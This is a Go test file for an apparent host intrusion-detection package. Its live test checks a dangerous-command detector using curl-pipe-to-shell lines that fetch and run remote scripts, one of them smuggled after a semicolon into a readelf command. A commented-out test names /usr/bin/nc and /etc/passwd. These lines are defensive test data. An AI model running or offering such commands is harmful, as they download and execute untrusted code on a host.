package core

import (
	"fmt"
	"testing"
)

//
//func TestFindBeforeAfterOfIPString(t *testing.T) {
//	actual:=findBeforeAfterOfIPString("123456789a8.8.8.8a123456789","8.8.8.8",10)
//	expect:="123456789aa123456789"
//	if actual!=expect{
//		t.Errorf("e:%s,a:%s",expect,actual)
//	}
//}
//
//func TestFindBeforeAfterOfIPString4(t *testing.T) {
//	actual:=findBeforeAfterOfIPString("123456789a8.8.8.8a12345678911111","8.8.8.8",10)
//	expect:="123456789aa123456789"
//	if actual!=expect{
//		t.Errorf("e:%s,a:%s",expect,actual)
//	}
//}
//
//func TestFindBeforeAfterOfIPString1(t *testing.T) {
//	actual:=findBeforeAfterOfIPString("456789a8.8.8.8a123456","8.8.8.8",10)
//	expect:="456789aa123456"
//	if actual!=expect{
//		t.Errorf("e:%s,a:%s",expect,actual)
//	}
//}
//
//func TestFindBeforeAfterOfIPString2(t *testing.T) {
//	actual:=findBeforeAfterOfIPString("8.8.8.8a123456789","8.8.8.8",10)
//	expect:="a123456789"
//	if actual!=expect{
//		t.Errorf("e:%s,a:%s",expect,actual)
//	}
//}
//
//func TestFindBeforeAfterOfIPString3(t *testing.T) {
//	actual:=findBeforeAfterOfIPString("8.8.8.8","8.8.8.8",10)
//	expect:=""
//	if actual!=expect{
//		t.Errorf("e:%s,a:%s",expect,actual)
//	}
//}

//func TestCheckIsHttpServiceTrue(t *testing.T){
//	actual:=checkIsHttpService("123.125.52.43:80")
//	expect:=true
//	if actual!=expect{
//		t.Errorf("e:%s,a:%s",expect,actual)
//	}
//}

//func TestCheckIsHttpServiceTrue443(t *testing.T){
//	actual:=checkIsHttpService("36.110.213.49:443")
//	expect:=true
//	if actual!=expect{
//		t.Errorf("e:%s,a:%s",expect,actual)
//	}
//	actual=checkIsHttpService("222.73.112.2:443")
//	expect=true
//	if actual!=expect{
//		t.Errorf("e:%s,a:%s",expect,actual)
//	}
//}
//
//func TestCheckIsHttpServiceTrue80_2(t *testing.T){
//	actual:=checkIsHttpService("2.2.2.2:7777")
//	expect:=false
//	if actual!=expect{
//		t.Errorf("e:%s,a:%s",expect,actual)
//	}
//}

//func TestHasAbnormalConnectByDip(t *testing.T){
//	actual:=HasAbnormalConnectByDip("123.125.54.245",5)
//	expect:=true
//	if actual!=expect{
//		t.Errorf("e:%s,a:%s",expect,actual)
//	}
//
//	actual=HasAbnormalConnectByDip("123.125.54.244",3)
//	expect=false
//	if actual!=expect{
//		t.Errorf("e:%s,a:%s",expect,actual)
//	}
//
//	actual=HasAbnormalConnectByDip("10.18.25.89",5)
//	expect=false
//	if actual!=expect{
//		t.Errorf("e:%s,a:%s",expect,actual)
//	}
//}

//func TestGetFileTypeInfo(t *testing.T){
//	actual:=getFileTypeInfo("/home/wwwroot/default/testby/testcmd.php")
//	expect:=TEXT
//	if actual!=expect{
//		t.Errorf("e:%s,a:%s",expect,actual)
//	}
//
//	actual=getFileTypeInfo("/usr/bin/nc")
//	expect=EXEC
//	if actual!=expect{
//		t.Errorf("e:%s,a:%s",expect,actual)
//	}
//
//	actual=getFileTypeInfo("/etc/passwd")
//	expect=TEXT
//	if actual!=expect{
//		t.Errorf("e:%s,a:%s",expect,actual)
//	}
//}

func TestGetFileTypeInfo(t *testing.T) {
	name, ppid, pcmd, pcwd, pExe, conn, uids, _ := getProcessInfoALL(int32(32347))
	//fmt.Println(checkIsDangerConnectionInfo(conn))
	fmt.Println(name, ppid, pcmd, pcwd, pExe, conn, uids)
	expect := 999
	actual := TEXT
	if actual != expect {
		t.Errorf("e:%s,a:%s", expect, actual)
	}

}

func TestCheckDE(t *testing.T) {
	actual := checkDE("sh -c ps axuwww|grep ops-agent|grep -v grep|grep -v echo|grep -v logsmt|awk 'BEGIN{sum=0}{sum+=$3 }END{print sum}'")
	expect := false
	if actual != expect {
		t.Errorf("e:%s,a:%s", expect, actual)
	}

	actual = checkDE("sh -c curl 2.2.2.2/testby/udp|sh 7f7b0c13ab1")
	expect = true
	if actual != expect {
		t.Errorf("e:%s,a:%s", expect, actual)
	}

	actual = checkDE("sh -c curl 2.2.2.2/udp|sh")
	expect = true
	if actual != expect {
		t.Errorf("e:%s,a:%s", expect, actual)
	}

	actual = checkDE("sh -c curl 11133.com/a|sh")
	expect = true
	if actual != expect {
		t.Errorf("e:%s,a:%s", expect, actual)
	}

	actual = checkDE("sh -c curl 11133.com/a.sh")
	expect = false
	if actual != expect {
		t.Errorf("e:%s,a:%s", expect, actual)
	}

	actual = checkDE("sh -c curl 1.2.211.124/testby/udp|/bin/bash 7f7b0c13ab10")
	expect = true
	if actual != expect {
		t.Errorf("e:%s,a:%s", expect, actual)
	}

	actual = checkDE("/bin/sh -c readelf -S /opt/work/hunter/data/store/detect_output/native/lib/armeabi/;curl 1.113.159.250 |sh;123.so")
	expect = true
	if actual != expect {
		t.Errorf("e:%s,a:%s", expect, actual)
	}

	actual = checkDE("sh -c /data05/tmp/taskTracker/jobcache/job_201903211051_19251529/attempt_201903211051_19251529_r_000981_0/work/././link-extract-merge | python rm_null_url.py  351f818240")
	expect = false
	if actual != expect {
		t.Errorf("e:%s,a:%s", expect, actual)
	}

}

//func TestFilter(t *testing.T){
//	rawResult:=make([][]string,0,0)
//	dipMap:=getDipCountDict(rawResult)
//	live_print("before len rawResult",len(rawResult))
//	rawResult=filterResultBySportDip(rawResult,dipMap)
//	live_print("af len rawResult",len(rawResult))
//
//}

//func TestCheckIsHttpServiceTrue80(t *testing.T){
//	actual:=checkIsHttpService("85.214.115.35:80")
//	expect:=true
//	if actual!=expect{
//		t.Errorf("e:%s,a:%s",expect,actual)
//	}}

//func TestCheckIsHttpServiceTrue80(t *testing.T){
//	actual:=checkIsHttpService("85.214.115.35:80")
//	expect:=true
//	if actual!=expect{
//		t.Errorf("e:%s,a:%s",expect,actual)
//	}
//	actual=checkIsHttpService("59.111.19.11:443")
//	expect=true
//	if actual!=expect{
//		t.Errorf("e:%s,a:%s",expect,actual)
//	}
//	actual=checkIsHttpService("95.211.218.51:80")
//	expect=true
//	if actual!=expect{
//		t.Errorf("e:%s,a:%s",expect,actual)
//	}
//	actual=checkIsHttpService("116.224.87.41:80")
//	expect=true
//	if actual!=expect{
//		t.Errorf("e:%s,a:%s",expect,actual)
//	}
//	actual=checkIsHttpService("121.40.36.198:80")
//	expect=true
//	if actual!=expect{
//		t.Errorf("e:%s,a:%s",expect,actual)
//	}
//}
//
//func TestCheckIsHttpServiceFalse(t *testing.T){
//	actual:=checkIsHttpService("123.125.52.43:89")
//	expect:=false
//	if actual!=expect{
//		t.Errorf("e:%s,a:%s",expect,actual)
//	}
//
//	actual=checkIsHttpService("205.204.101.152:25")
//	expect=false
//	if actual!=expect{
//		t.Errorf("e:%s,a:%s",expect,actual)
//	}
//}
